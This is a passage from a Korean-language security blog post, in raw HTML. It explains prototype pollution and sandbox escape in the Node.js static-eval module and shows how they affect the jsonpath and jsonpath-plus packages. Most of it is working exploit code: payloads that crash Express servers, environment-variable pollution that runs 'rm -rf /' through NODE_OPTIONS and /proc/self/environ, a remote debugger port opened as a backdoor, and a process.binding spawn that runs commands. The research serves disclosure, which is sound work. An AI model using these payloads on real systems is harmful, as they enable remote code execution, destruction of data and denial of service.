(&#123;&#125;).constructor.constructor</span></span><br><span class="line">ƒ <span class="title class_">Function</span>() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor(&quot;return process;&quot;)</span></span><br><span class="line">ƒ <span class="title function_">anonymous</span>(<span class="params"></span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">return</span> process;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor</span></span><br><span class="line">ƒ <span class="title class_">Object</span>() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor(&quot;return process;&quot;)</span></span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure><p><code>MemberExpression</code> 에서 <code>Object.constructor</code> 의 참조는 가능하지만<br> 함수 생성자인 <code>Object.constructor.constructor</code> 는 사용이 불가능합니다.</p><p><code>Object.constructor</code> 의 타입이 <code>Function</code> 이며 <code>MemberExpression</code> 에서 함수 타입 객체에 대해서는 어떠한 속성 참조도 금지되어 있기 떄문입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span> === obj.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure><p>그러나 <code>__proto__</code> 속성 참조를 통해 <code>Prototype Pollution</code>을 유발시킬 수 있는데요.<br> 자바스크립트에 존재하는 <code>__proto__</code>  속성은 <code>constructor.prototype</code> 의 이중 속성 참조를<br> 단번으로 가능하게 하는 별칭과 같은 역할을 합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;__defineGetter__&#x27;</span>](<span class="comment">/* prop */</span>, <span class="comment">/* getter */</span>);</span><br><span class="line">(&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;__defineGetter__&#x27;</span>](<span class="string">&#x27;polluted&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;)</span><br><span class="line"><span class="comment">// equals to</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;polluted&#x27;</span>, &#123;<span class="attr">value</span>: <span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure><p>여기서 참조한것은 객체 인스턴스의 <code>__proto__.__defineGetter__</code> 인데<br> 이는 <code>Object.prototype.__defineGetter__</code> 와 동일하며 <code>Object.defineProperty</code> 와 동일한 역할을 하는데, 우리는 이를 사용해 전역 객체 프로토타입에 정의를 추가할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;polluted&#x27;, function()&#123; return true; &#125;)`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(polluted); <span class="comment">// print &quot;true&quot;</span></span><br></pre></td></tr></table></figure><p>위와 같은 코드로 <code>static-eval</code> 에서의 프로토타입 오염을 확인할 수 있습니다.</p><p>프로토타입 오염 취약점은 어떻게 활용할 수 있을까요?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// make pollution</span></span><br><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;toString&#x27;, (&#123;&#125;)[&#x27;constructor&#x27;])`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"></span><br><span class="line"><span class="comment">// serve webapp</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;working!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>객체 생성자 프로토타입에 임의의 속성을 정의해 넣을 수 있는 것만으로 <code>DOS</code> 취약점으로 작용할 수 있습니다. 위 코드를 실행해보면, <code>toString</code> 속성이 오염된 상태에서 <code>express</code> 웹서버가 정상적으로 동작하지 않음을 확인할 수 있습니다.</p><hr><h2 id="Prototype-Pollution-to-Remote-Code-Execution"><a href="#Prototype-Pollution-to-Remote-Code-Execution" class="headerlink" title="Prototype Pollution to Remote Code Execution"></a>Prototype Pollution to Remote Code Execution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> inst = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">inst.<span class="property">__proto__</span>.<span class="property">isAdmin</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(isAdmin); <span class="comment">// print &quot;true&quot;</span></span><br></pre></td></tr></table></figure><p>프로토 타입 오염 취약점은 기본적으로 로직 바이패스에 흔히 사용될 수 있습니다.</p><p>세션에 정의되지 않은 속성값을 정의해 놓음으로서 인증을 우회한다던지 하는 방법이죠.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">command</span> = <span class="string">&#x27;console.log(&quot;executed!&quot;)&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (command) &#123;</span><br><span class="line">  <span class="built_in">eval</span>(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 rce 가 간단하게 가능했으면 좋겠지만, JS world 는 만만하지 않습니다.</p><p>객체 프로토타입 오염에 성공했다고 하더라도, 블랙박스 환경에서는 <code>Denial of Service</code> 이상의 영향력을 보이는 것이 어려울 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/nodejs/node/blob/master/lib/child_process.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line"><span class="keyword">const</span> envPairs = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    <span class="keyword">const</span> value = env[key];</span><br><span class="line">    <span class="keyword">if</span> (value !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        envPairs.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NodeJS의 내장 모듈이며, 서브 프로세스를 생성하는 데에 사용되는<br> child_process 모듈은 자식 프로세스를 생성할 때, 환경 변수를 복사하는 과정을 거치는데<br> 복사 과정에 위에서 언급된 <code>for in</code> 반복문을 사용하고 있으므로</p><p>process.env 객체 내부에 직접적으로 정의되지 않았더라도<br> process.env 의 프로토 타입인 Object.prototype 객체가 오염된다면<br> 자식 프로세스 생성에 쓰이는 환경 변수를 임의로 추가해낼 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NODE_OPTIONS=<span class="string">&#x27;--require /proc/self/environ&#x27;</span> node app.js</span><br><span class="line"><span class="comment"># same as</span></span><br><span class="line">node --require /proc/self/environ app.js</span><br></pre></td></tr></table></figure><p>또한 NodeJS 프로세스가 실행될 때, 스크립트가 실행되기 이전에 쓰이는 환경 변수중의 하나로 <code>NODE_OPTIONS</code> 환경변수가 존재하는데<br> 본 변수에 <code>--require [argv]</code> 와 같은 NodeJS 프로세스 실행에 사용되는 옵션을 추가하면<br> 스크립트 실행에 <code>--require [argv]</code> 추가하여 실행한 것과 같은 효과를 줍니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// make pollution</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">env</span> = &#123;</span><br><span class="line">  <span class="variable constant_">NODE_DEBUG</span> : <span class="string">&#x27;require(&quot;child_process&quot;).execSync(&quot;rm -rf /&quot;)//&#x27;</span>,</span><br><span class="line">  <span class="variable constant_">NODE_OPTIONS</span> : <span class="string">&#x27;-r /proc/self/environ&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fork</span>(<span class="string">&#x27;blank&#x27;</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">pipe</span>(process.<span class="property">stdout</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">spawnSync</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">execSync</span>(<span class="string">&#x27;node  blank&#x27;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure><p>위 두가지를 복합적으로 사용하여 <code>RCE</code>를 유발하는 방법입니다.<br> 환경 변수에 스크립트를 포함시키고, 환경 변수가 저장되는 <code>/proc/self/environ</code> 파일을 <code>require</code> 옵션 파일로 사용할 수 있습니다.</p><p>서브 프로세스 생성 시에 <code>NODE_DEBUG</code> 환경변수는 <code>/proc/self/environ</code> 에  <code>NODE_OPTIONS</code> 보다 더 앞에 작성되므로<br> 일반 환경변수보다, <code>NODE_DEBUG</code> 를 사용하면, <code>reliability</code> 를 가지도록 할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;execSync&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;env&#x27;, function()&#123; return &#123;</span></span><br><span class="line"><span class="string">    NODE_DEBUG: &#x27;require(&quot;child_process&quot;).execSync(&quot;rm -rf /&quot;)//&#x27;,</span></span><br><span class="line"><span class="string">    NODE_OPTIONS: &#x27;-r /proc/self/environ&#x27;</span></span><br><span class="line"><span class="string">&#125;&#125;);`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"><span class="title function_">execSync</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br></pre></td></tr></table></figure><p>이를 <code>static-eval</code> 모듈에 적용하면 위와 같습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// make pollution</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">env</span> = &#123;</span><br><span class="line">    <span class="variable constant_">NODE_OPTIONS</span> : <span class="string">&#x27;--inspect-brk=0.0.0.0:1234&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fork</span>(<span class="string">&#x27;blank&#x27;</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">exec</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">execSync</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">spawnSync</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>/proc/self/environ</code> 파일을 사용하는 이전의 방법은 리눅스 서버에서만 작동한다는 단점이 존재합니다.<br> 하지만, <code>--inspect-brk</code> 옵션을 이용하여, 서버에 디버그 포트를 열도록 만듦으로서 윈도우에서도 응용 가능합니다.<br> 본 옵션을 사용하여 서브 프로세스를 생성하면, 옵션에 설정된 포트로 디버거가 연결될 때가지 대기하며<br> 연결이 가능할 경우, 백도어와 동일한 역할을 수행할 수 있습니다.</p><p>디버그 포트가 열리면 <code>node inspect host:port</code> 와 같은 명령을 통해 서버에 연결할 수 있습니다.<br> 이후 <code>exec</code> 서브 커맨드를 사용하면 <code>exec child_process.exec(&#39;rm -rf /&#39;)</code> 와 같이 자유롭게 명령 실행이 가능합니다.</p><p><img src="/2019/10/image-3.png" alt="img"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;execSync&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;env&#x27;, function()&#123; return &#123;</span></span><br><span class="line"><span class="string">    NODE_OPTIONS: &#x27;--inspect-brk=0.0.0.0:1234&#x27;</span></span><br><span class="line"><span class="string">&#125;&#125;)`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"><span class="title function_">execSync</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br></pre></td></tr></table></figure><p>두번째 방법을 <code>static-eval</code> 모듈에 적용하면 위와 같은 모습이 됩니다.</p><hr><h2 id="Jsonpath-x2F-Jsonpath-plus"><a href="#Jsonpath-x2F-Jsonpath-plus" class="headerlink" title="Jsonpath &#x2F; Jsonpath-plus"></a>Jsonpath &#x2F; Jsonpath-plus</h2><p><code>static-eval</code> 에 의존성을 가지는 모듈인 <code>JSONPath</code> 는 <code>XML</code>에서의  <code>XPath</code> 와 같은 역할을 하도록 디자인 된, 쿼리 언어의 일종입니다. 그러나 RFC로 정의된 <code>Xpath</code> 와 달리 <code>JSONPath</code> 는 명확한 정의가 이루어지지 않았기 때문에, 구현에 많은 모호함이 있습니다.</p><p><img src="/img/2020/01/1576102306546.png" alt="img"></p><p><code>JSONPath</code> 는 <code>XPath</code> 와 마찬가지로 표현식에 일치하는 문서를 필터링하는 필터 기능을 제공하며, 문법은 위와 같습니다. 확인해보면 소괄호 안에 <code>subscript</code> 를 삽입하는 <code>static evaluation</code> 기능을 제공한다고 되어 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jp = <span class="built_in">require</span>(<span class="string">&#x27;jsonpath&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> data = [&#123;&#125;]</span><br><span class="line"><span class="keyword">var</span> names = jp.<span class="title function_">query</span>(data, <span class="string">`$..[?( (&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;toString&#x27;, (&#123;&#125;)[&#x27;constructor&#x27;]) )]`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;working&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>발견한 취약점을 통해 <code>JSONPath</code> 를 사용하는 서버에 <code>Denial of Service</code> 를 유발할 수 있음을 확인할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="title class_">JSON</span>Path&#125; = <span class="built_in">require</span>(<span class="string">&#x27;jsonpath-plus&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> json = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> result = <span class="title class_">JSON</span>Path(&#123;<span class="attr">path</span>: <span class="string">`$..[?( @[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;toString&#x27;, @[&#x27;constructor&#x27;]) )]`</span>, json&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;working&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p><code>jsonpath-plus</code> 모듈 또한 비슷한 로직으로 구성되며, <code>static-eval</code> 모듈을 사용하기에 동일한 방법으로 <code>Denial of Service</code> 를 유발할 수 있습니다. <code>jsonpath</code>과 <code>jsonpath-plus</code> 모듈은 현재를 기준으로 각 1594만, 1382만 다운로드를 기록하였습니다.</p><hr><h2 id="Another-Exploitation"><a href="#Another-Exploitation" class="headerlink" title="Another Exploitation"></a>Another Exploitation</h2><p><code>static-eval</code> 모듈에서 <code>RCE</code>를 유발하는 다른 방법입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">name</span>: <span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// &#123;name: &quot;value&quot;&#125;</span></span><br><span class="line">obj = <span class="string">&#x27;apple&#x27;</span>, &#123;obj&#125;</span><br><span class="line"><span class="comment">// &#123;obj: &quot;apple&quot;&#125;</span></span><br><span class="line">name=<span class="string">&#x27;apple&#x27;</span>, &#123;<span class="attr">name</span>:<span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// &#123;name: &quot;value&quot;&#125;</span></span><br><span class="line">&#123;[name]:<span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// &#123;apple: &quot;value&quot;&#125;</span></span><br><span class="line">&#123;[<span class="variable language_">console</span>.<span class="title function_">log</span>(process)]:<span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// process &#123;version: &quot;v12.10.0&quot;, versions: &#123;…&#125;, arch: &quot;x64&quot;, platform: &quot;win32&quot;, release: &#123;…&#125;, …&#125;</span></span><br></pre></td></tr></table></figure><p>자바스크립트에서 객체를 정의할 때, <code>key name</code> 부분에 배열 첨자가 사용되면 내부 스크립트를 <code>evaluation</code> 하고<br> 문자열로 변환하여 <code>key</code> 값에 사용합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&#123;[process]:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">// &#123;undefined: 1&#125;</span></span><br></pre></td></tr></table></figure><p><code>static-eval</code> 모듈에서는 이러한 Expression을 처리하지 않고 있기 때문에<br> 내부에 들어가는 스크립트 실행이 이루어지지 않습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> unparse = <span class="built_in">require</span>(<span class="string">&#x27;escodegen&#x27;</span>).<span class="property">generate</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;FunctionExpression&#x27;</span>) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Function</span>(keys.<span class="title function_">join</span>(<span class="string">&#x27;, &#x27;</span>), <span class="string">&#x27;return &#x27;</span> + <span class="title function_">unparse</span>(node)).<span class="title function_">apply</span>(<span class="literal">null</span>, vals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그러나 함수 생성자의 인자로 사용되면 조금 다른 동작을 보입니다.<br> <code>static-eval</code> 모듈 내부에서 함수 정의에 사용하는 <code>escodegen</code> 모듈은 그 표현식을 지원하기 때문인데요.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (&#123;[process.<span class="property">version</span>]:<span class="number">1</span>&#125;);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// &#123;v12.10.0: 1&#125;</span></span><br></pre></td></tr></table></figure><p>따라서 코드를 함수 정의식 내부에 삽입하여 사용자 함수를 생성해 줌으로서<br> 임의의 코드를 실행하는 것이 가능합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;parse&#125; = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`</span></span><br><span class="line"><span class="string">(function () &#123;</span></span><br><span class="line"><span class="string">    (&#123;</span></span><br><span class="line"><span class="string">        [process.binding(&#x27;spawn_sync&#x27;).spawn(&#123;</span></span><br><span class="line"><span class="string">            file: &#x27;calc&#x27;,</span></span><br><span class="line"><span class="string">            args: [&#x27;1&#x27;],</span></span><br><span class="line"><span class="string">            envPairs: [&#x27;y=&#x27;],</span></span><br><span class="line"><span class="string">            stdio: [&#123;</span></span><br><span class="line"><span class="string">                type: &#x27;pipe&#x27;,</span></span><br><span class="line"><span class="string">                readable: 1</span></span><br><span class="line"><span class="string">            &#125;]</span></span><br><span class="line"><span class="string">        &#125;)]: 1</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">&#125;)()`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line">evaluate(ast);</span><br></pre></td></tr></table></figure><p>전역 process 객체를 통해 임의 명령 실행을 수행한 예제입니다.</p><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/">https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/</a></li><li><a 